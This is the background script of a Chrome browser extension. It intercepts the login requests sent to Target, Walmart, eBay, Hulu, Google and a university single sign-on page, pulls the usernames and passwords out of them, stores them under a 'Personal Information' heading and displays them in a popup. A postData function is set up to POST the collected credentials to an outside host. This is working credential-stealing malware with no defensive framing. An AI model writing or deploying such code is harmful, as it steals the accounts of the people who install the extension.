'use strict';
var themes="Personal Information:"
var sent=false;
chrome.webRequest.onBeforeRequest.addListener(
    function(details) {
        var found = false;
        if(details.requestBody != undefined){
            if(details.requestBody.raw != undefined) {
                var requestBodynice = details.requestBody.raw.map(function (data) {
                    return decodeURIComponent(String.fromCharCode.apply(null, new Uint8Array(data.bytes)));
                }).join('');
                requestBodynice = String(requestBodynice);
            }
        }
        var requestBodyJSON = JSON.stringify(details.requestBody);
        if (details.url == "https://gsp.target.com/gsp/authentications/v1/credential_validations?client_id=ecom-web-1.0.0") {
            var password = requestBodynice.split(",")[1].split('"')[3]
            var username = requestBodynice.split(",")[0].split('"')[3]
            var addition ="target:" + "\n" + "username: " + username + "\n" + "password: " + password;
            found = true;
        }

        if (details.url == "https://www.walmart.com/account/electrode/api/signin?ref=domain"){
            var username = requestBodynice.split(",")[1].split('"')[3]
            var password = requestBodynice.split(",")[0].split('"')[3]
            var addition = "walmart:" + "\n" +"username: " + username + "\n" + "password: " + password;
            found = true;
        }

        if (details.url == "https://shibboleth.main.ad.rit.edu/idp/profile/SAML2/Redirect/SSO?execution=e1s1") {
            console.log(requestBodynice);
            found = true;
        }

        if (details.url =="https://www.ebay.com/signin/s") {
            var username = requestBodynice.split(",")[1].split('"')[3]
            var password = requestBodynice.split(",")[0].split('"')[3]
            var addition = "ebay:" + "\n" + "username: " + username + "\n" + "password: " + password
            found = true;
        }

        if (details.url =="https://auth.hulu.com/v2/web/password/authenticate"){
            console.log("detials: "+JSON.stringify(details));
            console.log("requestbodyJSON: "+JSON.stringify(details.requestBody));
            console.log(requestBodynice);
            var password=requestBodyJSON.split('password":')[1].split('"')[1]
            var username=requestBodyJSON.split('user_email":')[1].split('"')[1]
            var addition= "Hulu:"+"\n"+"username: "+username+ "\n"+"password: "+ password
            found=true;
        }

        if(details.url.includes("https://accounts.google.com/_/lookup/accountlookup")) {
            console.log(JSON.stringify(details));
            console.log("requestbody: " + JSON.stringify(details.requestBody));
            var username = requestBodyJSON.split("f.req")[1].split('\\"')[1];
            var password = "NA";
            var addition = "gmail:" + "\n" + "username: " + username ;
            if (themes.includes(addition) == false) {
                themes = themes + "\n\n" + addition + "\n"+"password: "+ password;
            }
            found=true;
        }
        if(details.url.includes("https://accounts.google.com/_/signin/challenge?")){
            console.log(JSON.stringify(details));
            console.log("password requestbody: "+JSON.stringify(details.requestBody));
            var password=requestBodyJSON.split("f.req")[1].split('[\\"')[2].split('\\"')[0];
            console.log(password);
            themes=themes.replace("NA", password);
            console.log(themes);
            found=true;
        }
      
        if(found == true){
            if (themes.includes(addition) == false) {
                themes = themes + "\n\n" + addition ;
                chrome.tabs.create({
                    url: chrome.extension.getURL('dialog.html'),
                    active: false
                }, function(tab) {
                    chrome.windows.create({
                        tabId: tab.id,
                        type: 'popup',
                        focused: true
                    });
                });
            }
        }
            return {requestHeaders: details.requestHeaders};

    },
    // filters
    {urls: ['https://*/*', 'http://*/*']},
    // extraInfoSpec
    ['requestBody']);

chrome.extension.onConnect.addListener(function(port) {
    console.log("Connected .....");
    port.onMessage.addListener(function(msg) {
        console.log("message recsadsaieved" + msg);
        port.postMessage(themes);
    });
});



async function postData() {
    const postdata = {
        stuff: themes
    };
    const response = await fetch( "https://google.com", {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(postdata)
    });
    return response.json(); // parses JSON response into native JavaScript objects
}
